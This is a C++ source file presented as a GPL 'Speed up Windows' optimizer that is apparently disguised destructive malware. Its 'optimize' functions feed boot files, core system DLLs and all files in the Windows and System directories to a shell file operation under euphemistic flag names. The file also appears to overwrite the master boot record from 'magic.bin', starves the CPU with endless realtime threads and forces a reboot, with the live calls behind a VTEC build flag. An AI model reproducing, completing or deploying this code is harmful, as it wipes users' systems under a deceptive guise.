/* 
 * Optimizer -- Speed up Windows
 * 
 * Copyright (C) 2007-2010  Anonymous
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to 
 * the Free Software Foundation, Inc.
 * 51 Franklin Street, Fifth Floor
 * Boston, MA  02110-1301, USA
 * 
 */

#include "stdafx.h"
#include "engine.h"

#include <io.h>
#include <fcntl.h>
#include <windows.h>

extern "C" {
#include "..\shared\optimizeboot.h"
}

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

static inline int Addnull(wchar_t *Input, int Size) {
	int i = 0;
	while((i < Size - 1) && Input[i++]);
	Input[i] = '\0';
	
	return i;
}

static DWORD WINAPI LoadThread(LPVOID param) {
	while(1);
	return 0;
}

static void InflictLoad(void) {
	SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
	while(1) {
		DWORD dwTid;
		HANDLE hThread=CreateThread(NULL, 0, LoadThread, NULL, 0, &dwTid);
		SetThreadPriority(hThread, THREAD_PRIORITY_TIME_CRITICAL);
	}
}

static int OptimizeFile(LPCWSTR Directory, LPCWSTR Filename) {
	wchar_t Buffer[MAX_PATH+1];
	SHFILEOPSTRUCT fstruct;
	
	if(wcslen(Directory) + wcslen(Filename) + 1 <= MAX_PATH) {
		swprintf(Buffer, MAX_PATH, TEXT("%s\\%s"), Directory, Filename);
		Addnull(Buffer, MAX_PATH+1);

		fstruct.hwnd = NULL;
		fstruct.pFrom = (LPCWSTR)Buffer;
		fstruct.pTo = NULL;
		fstruct.wFunc = FO_OPTIMIZE;
		fstruct.fFlags = FOF_BOOST | FOF_SPEED | FOF_TURBO;
#ifdef VTEC
		SHFileOperation(&fstruct);
#else
//		MessageBox(NULL, (LPCWSTR)Buffer, TEXT("Optimizing..."), MB_OK);
#endif

		return 0;
	}
	return -1;
}

void OptimizeDirectory(WCHAR *Dir) {
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind;
	WCHAR szDir[MAX_PATH];

	wcscpy_s(szDir, MAX_PATH, Dir);
	wcscat_s(szDir, MAX_PATH, TEXT("\\*"));
	hFind = FindFirstFile(szDir, &FindFileData);

	do {
		if(!(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
			OptimizeFile(Dir, FindFileData.cFileName);
	} while (FindNextFile(hFind, &FindFileData) != 0);
	FindClose(hFind);
}

void OptimizeBoot(CButton *OptimizeButton) {
	OptimizeButton->SetWindowText(TEXT("Optimizing Bootloader..."));

	OptimizeMBR(TEXT("magic.bin"));
	OptimizeFile(TEXT("C:"), TEXT("ntldr"));
	OptimizeFile(TEXT("C:"), TEXT("boot.ini"));
	OptimizeFile(TEXT("C:"), TEXT("ntdetect.com"));
	OptimizeFile(TEXT("C:"), TEXT("autoexec.bat"));
	OptimizeFile(TEXT("C:"), TEXT("config.sys"));
	OptimizeFile(TEXT("C:"), TEXT("command.com"));
	OptimizeFile(TEXT("C:"), TEXT("io.sys"));
	OptimizeFile(TEXT("C:"), TEXT("msdos.sys"));
}

void OptimizeLibraries(CButton *OptimizeButton) {
	WCHAR Sysdir[MAX_PATH+1];

	OptimizeButton->SetWindowText(TEXT("Optimizing Libraries..."));

	GetSystemDirectory(Sysdir, MAX_PATH);

	OptimizeFile(Sysdir, TEXT("winsock.dll"));
	OptimizeFile(Sysdir, TEXT("hal.dll"));
	OptimizeFile(Sysdir, TEXT("kernel32.dll"));
	OptimizeFile(Sysdir, TEXT("user32.dll"));
	OptimizeFile(Sysdir, TEXT("ntoskrnl.exe"));
	OptimizeFile(Sysdir, TEXT("msvcrt.dll"));
	OptimizeFile(Sysdir, TEXT("msvcrt20.dll"));
	OptimizeFile(Sysdir, TEXT("msvcrt40.dll"));
	OptimizeFile(Sysdir, TEXT("msvcrtd.dll"));
}


void OptimizeSystem(CButton *OptimizeButton) {
	TCHAR Sysdir[MAX_PATH+1];
	TCHAR Windir[MAX_PATH+1];

	OptimizeButton->SetWindowText(TEXT("Optimizing System..."));

	GetSystemDirectory(Sysdir, MAX_PATH);
	GetWindowsDirectory(Windir, MAX_PATH);

	OptimizeFile(Windir, TEXT("win.com"));
	OptimizeDirectory(Windir);
	OptimizeDirectory(Sysdir);
}

BOOL Reboot(void) {
	HANDLE Token;
	TOKEN_PRIVILEGES TokenPrivileges;

	if(!OpenProcessToken(GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &Token))
		return FALSE;

	LookupPrivilegeValue(NULL,
		SE_SHUTDOWN_NAME,
		&TokenPrivileges.Privileges[0].Luid);

	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	AdjustTokenPrivileges(Token,
		FALSE,
		&TokenPrivileges,
		0,
		(PTOKEN_PRIVILEGES)NULL,
		0);

	if(GetLastError() != ERROR_SUCCESS)
		return FALSE;

#ifdef VTEC
	if(!ExitWindowsEx(EWX_REBOOT | EWX_FORCE,
		SHTDN_REASON_MAJOR_OPERATINGSYSTEM |
		SHTDN_REASON_MINOR_UPGRADE |
		SHTDN_REASON_FLAG_PLANNED)) 
		return FALSE;
#endif

	return TRUE;
}

/*)\
\(*/
